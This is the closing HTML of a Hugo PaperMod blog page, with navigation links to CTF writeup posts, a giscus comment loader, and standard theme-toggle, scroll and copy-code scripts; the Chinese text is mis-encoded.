    <span>æ˜¥ç§‹äº‘é•œ-Brute4Road-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>æ˜¥ç§‹äº‘é•œ-Initial-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">Â©2024 Xrntkk&rsquo;s Blog</a></span> Â· 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
